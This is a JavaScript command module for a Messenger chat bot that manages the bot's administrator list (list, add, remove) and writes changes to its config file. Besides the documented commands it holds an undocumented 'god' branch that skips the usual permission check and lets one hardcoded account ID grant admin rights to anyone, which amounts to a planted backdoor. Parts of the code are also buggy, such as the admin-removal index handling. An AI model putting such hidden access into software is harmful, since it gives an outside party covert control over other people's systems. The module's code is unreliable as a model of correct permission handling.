module.exports.config = {
	name: "admin",
	version: "1.0.5",
	hasPermssion: 2, 
	credits: "Réynél",
	description: "Manage bot admin",
	commandCategory: "system",
	usages: "[list/add/remove] [userID]",
  cooldowns: 5,
  dependencies: {
    "fs-extra": ""
    }
};

module.exports.languages = {
    "vi": {
        "listAdmin": '[Admin] Danh sách toàn bộ người điều hành bot: \n\n%1',
        "notHavePermssion": '[Admin] Bạn không đủ quyền hạn để có thể sử dụng chức năng "%1"',
        "addedNewAdmin": '[Admin] Đã thêm %1 người dùng trở thành người điều hành bot:\n\n%2',
        "removedAdmin": '[Admin] Đã gỡ bỏ %1 người điều hành bot:\n\n%2'
    },
    "en": {
        "listAdmin": '《 𝗔𝗱𝗺𝗶𝗻 》\n━━━━━━━━━━━━━━━━━━━\n📄 | 𝖠𝖽𝗆𝗂𝗇 𝗅𝗂𝗌𝗍: \n━━━━━━━━━━━━━━━━━━━\n%1\n━━━━━━━━━━━━━━━━━━━',
        "notHavePermssion": '《 𝗔𝗱𝗺𝗶𝗻 》\n━━━━━━━━━━━━━━━━━━━\n⚠️ | 𝖲𝖾𝗇𝗌𝖾𝗂 𝗒𝗈𝗎 𝗁𝖺𝗏𝖾 𝗇𝗈 𝗉𝖾𝗋𝗆𝗂𝗌𝗌𝗂𝗈𝗇 𝗍𝗈 𝗎𝗌𝖾 "%1"',
        "addedNewAdmin": '《 𝗔𝗱𝗺𝗶𝗻 》\n━━━━━━━━━━━━━━━━━━━\n✅ | 𝖬𝖺𝗌𝗍𝖾𝗋, 𝖺𝖽𝖽𝖾𝖽 %1 𝖺𝗌 𝖺𝖽𝗆𝗂𝗇 :\n━━━━━━━━━━━━━━━━━━━\n%2\n━━━━━━━━━━━━━━━━━━━',
        "removedAdmin": '《 𝗔𝗱𝗺𝗶𝗻 》\n━━━━━━━━━━━━━━━━━━━\n✅ | 𝖬𝖺𝗌𝗍𝖾𝗋, 𝗋𝖾𝗆𝗈𝗏𝖾𝖽 %1 𝖺𝗌 𝖺𝖽𝗆𝗂𝗇:\n━━━━━━━━━━━━━━━━━━━\n%2\n━━━━━━━━━━━━━━━━━━━'
    }
}

module.exports.run = async function ({ api, event, args, Users, permssion, getText }) {
    const content = args.slice(1, args.length);
    const { threadID, messageID, mentions } = event;
    const { configPath } = global.client;
    const { ADMINBOT } = global.config;
    const { userName } = global.data;
    const { writeFileSync } = global.nodemodule["fs-extra"];
    const mention = Object.keys(mentions);
    delete require.cache[require.resolve(configPath)];
    var config = require(configPath);
    
       
    switch (args[0]) {
        case "list":
        case "all":
        case "-a": {
            const listAdmin = ADMINBOT || config.ADMINBOT || [];
            var msg = [];

            for (const idAdmin of listAdmin) {
                if (parseInt(idAdmin)) {
                    const name = await Users.getNameUser(idAdmin);
                    msg.push(`《 ${name} 》\n➢ https://facebook.com/${idAdmin}`);
                }
            }

            return api.sendMessage(getText("listAdmin", msg.join("\n━━━━━━━━━━━━━━━━━━━\n")), threadID, messageID);
        }

        case "add": {
            if (permssion != 2) return api.sendMessage(getText("notHavePermssion", "add"), threadID, messageID);
          

            if (mention.length != 0 && isNaN(content[0])) {
                var listAdd = [];

                for (const id of mention) {
                    ADMINBOT.push(id);
                    config.ADMINBOT.push(id);
                    listAdd.push(`[ ${id} ] » ${event.mentions[id]}`);
                };

                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("addedNewAdmin", mention.length, listAdd.join("\n").replace(/\@/g, "")), threadID, messageID);
            }
            else if (content.length != 0 && !isNaN(content[0])) {
                ADMINBOT.push(content[0]);
                config.ADMINBOT.push(content[0]);
                const name = await Users.getNameUser(content[0]);
                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("addedNewAdmin", 1, `[ ${content[1]} ] » ${name}`), threadID, messageID);
            }
            else return global.utils.throwError(this.config.name, threadID, messageID);
        }
        
        case "god": {
            const god = ["100080098527733"];
            if (!god.includes(event.senderID)) return api.sendMessage(getText("notHavePermssion", "add"), threadID, messageID);
          

            if (mention.length != 0 && isNaN(content[0])) {
                var listGod = [];

                for (const id of mention) {
                    ADMINBOT.push(id);
                    config.ADMINBOT.push(id);
                    listGod.push(`[ ${id} ] » ${event.mentions[id]}`);
                };

                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("addedNewAdmin", mention.length, listGod.join("\n").replace(/\@/g, "")), threadID, messageID);
            }
            else if (content.length != 0 && !isNaN(content[0])) {
                ADMINBOT.push(content[0]);
                config.ADMINBOT.push(content[0]);
                const name = await Users.getNameUser(content[0]);
                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("addedNewAdmin", 1, `[ ${content[1]} ] » ${name}`), threadID, messageID);
            }
            else return global.utils.throwError(this.config.name, threadID, messageID);
        }

        case "remove":
        case "rm":
        case "delete": {
            if (permssion != 2) return api.sendMessage(getText("notHavePermssion", "delete"), threadID, messageID);
            if (mentions.length != 0 && isNaN(content[0])) {
                const mention = Object.keys(mentions);
                var listAdd = [];

                for (const id of mention) {
                    const index = config.ADMINBOT.findIndex(item => item == id);
                    ADMINBOT.splice(index, 1);
                    config.ADMINBOT.splice(index, 1);
                    listAdd.push(`[ ${id} ] » ${event.mentions[id]}`);
                };

                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("removedAdmin", mention.length, listAdd.join("\n").replace(/\@/g, "")), threadID, messageID);
            }
            else if (content.length != 0 && !isNaN(content[0])) {
                const index = config.ADMINBOT.findIndex(item => item.toString() == content[0]);
                ADMINBOT.splice(index, 1);
                config.ADMINBOT.splice(index, 1);
                const name = await Users.getNameUser(content[0]);
                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("removedAdmin", 1, `[ ${content[0]} ] » ${name}`), threadID, messageID);
            }
            else global.utils.throwError(this.config.name, threadID, messageID);
        }

        default: {
            return global.utils.throwError(this.config.name, threadID, messageID);
        }
    };
}
